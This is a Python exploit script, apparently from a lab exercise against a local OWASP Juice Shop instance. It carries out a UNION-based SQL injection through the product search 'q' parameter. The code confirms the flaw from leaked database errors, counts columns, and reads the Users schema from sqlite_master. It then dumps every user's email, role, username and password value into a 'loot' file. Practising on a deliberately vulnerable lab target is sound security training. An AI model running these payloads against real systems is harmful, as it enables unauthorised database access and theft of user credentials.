#!/usr/bin/env python3
"""
Engagement : c05-sqli-union-dump
Target     : http://host.docker.internal:3000  (OWASP Juice Shop 20.3.0, own lab)
Vuln       : UNION-based SQL injection (SQLite) in GET /rest/products/search?q=
             The value of `q` is concatenated into:
                 SELECT * FROM Products WHERE ((name LIKE '%<q>%' OR description LIKE '%<q>%'))
                 AND deletedAt IS NULL
             The Products result set has 10 columns, so a 10-value UNION SELECT is
             rendered verbatim back into the JSON response.

Column mapping (verified with marker values):
    col1 -> id            col2 -> name         col3 -> description   col4 -> price
    col5 -> deluxePrice   col6 -> image        col7 -> alternateImages
    col8 -> createdAt     col9 -> updatedAt    col10 -> deletedAt

Payload used:
    zzz')) UNION SELECT id,email,role,4,5,6,7,8,9,10 FROM Users ORDER BY 1 LIMIT 10--

Outputs:
    /workspace/evidence/c5_users.txt          first 10 rows: email<TAB>role
    /workspace/loot/c5_users_full.json        full dump (id, username, email, password, role)
"""
import json
import os
import sys

import requests

BASE = "http://host.docker.internal:3000"
ENDPOINT = f"{BASE}/rest/products/search"
CLOSE = "zzz')) "          # closes LIKE '%..', both WHERE parens, comments out the rest
RAW = "/workspace/loot/c5_users_full.json"
EV = "/workspace/evidence/c5_users.txt"

SESSION = requests.Session()


def inject(sql: str, timeout: int = 20) -> list:
    """Run `sql` after the quote-closing sequence and return the JSON `data` rows."""
    r = SESSION.get(ENDPOINT, params={"q": CLOSE + sql + "--"}, timeout=timeout)
    if not r.headers.get("content-type", "").startswith("application/json"):
        raise RuntimeError(f"injection failed (HTTP {r.status_code}): {r.text[:300]}")
    return r.json().get("data", [])


def main() -> int:
    # 1. proof of injection: leak the DB error for a broken payload
    r = SESSION.get(ENDPOINT, params={"q": "apple'"}, timeout=15)
    print(f"[1] Error-based confirmation: HTTP {r.status_code} -> "
          f"{'SQLITE_ERROR' if 'SQLITE_ERROR' in r.text else 'no DB error'}")

    # 2. column count = 10 (1..9 -> "UNION do not have the same number of result columns")
    rows = inject("UNION SELECT 1,2,3,4,5,6,7,8,9,10")
    print(f"[2] Column count = {len(rows[0]) if rows else '?'} (JSON fields: {', '.join(rows[0]) if rows else '-'})")

    # 3. enumerate the Users table DDL from sqlite_master
    ddl = inject("UNION SELECT 1,type,name,4,5,sql,7,8,9,10 FROM sqlite_master WHERE name='Users'")[0]["image"]
    print(f"[3] Schema: {ddl[:120]}...")

    total = inject("UNION SELECT 1,'n',count(*),4,5,6,7,8,9,10 FROM Users")[0]["description"]
    print(f"[4] Users table contains {total} rows")

    # 4. UNION dump: email -> name column, role -> description column
    print("[5] UNION SELECT id,email,role,... FROM Users ORDER BY 1  (first 10 of 24 shown)")
    # Seed 'zzz' matches no product, so every returned row comes from the UNION.
    # (A string literal in col7/image trips a route-level filter -> keep it numeric.)
    rows = inject("UNION SELECT id,email,role,4,5,6,7,8,9,10 FROM Users ORDER BY 1")[:10]
    if not rows:
        print("[-] UNION dump returned no user rows")
        return 1

    for r_ in rows:
        print(f"    {r_['id']:<3} {r_['name']:<30} {r_['description']}")

    # 5. full table (all rows, id/username/email/password/role) for the loot folder
    full = inject("UNION SELECT id,email,role,4,username,password,7,8,9,10 FROM Users ORDER BY 1")
    os.makedirs(os.path.dirname(RAW), exist_ok=True)
    with open(RAW, "w", encoding="utf-8") as fh:
        json.dump([{"id": r_["id"], "email": r_["name"], "role": r_["description"],
                    "username": r_["image"], "password": r_["deluxePrice"]} for r_ in full],
                  fh, indent=2)
    print(f"[6] Full table ({len(full)} rows) -> {RAW}")

    # 6. required evidence file: first 10 rows, email<TAB>role
    os.makedirs(os.path.dirname(EV), exist_ok=True)
    with open(EV, "w", encoding="utf-8", newline="\n") as fh:
        for r_ in rows[:10]:
            fh.write(f"{r_['name']}\t{r_['description']}\n")
    print(f"[+] Wrote {min(len(rows), 10)} rows (email<TAB>role) -> {EV}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
